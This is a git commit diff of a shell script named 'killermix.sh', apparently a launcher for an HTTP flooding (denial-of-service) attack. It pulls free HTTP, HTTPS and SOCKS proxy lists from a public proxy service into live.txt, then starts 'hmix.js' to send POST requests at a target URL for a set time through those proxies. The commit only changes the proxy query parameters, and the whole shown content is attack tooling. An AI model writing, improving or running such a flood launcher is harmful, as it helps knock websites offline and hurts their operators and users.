fe638eea82971b248c51d19cd46bd8e5fb4ff940
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-04-15 16:15:33 +0700

    her

--- killermix.sh
+++ killermix.sh
@@ -8,7 +8,7 @@ TIME=$2
 
 # Tải proxy loại HTTP, HTTPS, SOCKS4, SOCKS5 vào live.txt 
 for type in http https socks4 socks5; do
-  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&timeout=999999&country=vn&protocol=${type}"
+  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=999999&protocol=${type}"
 done > live.txt
 
 node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
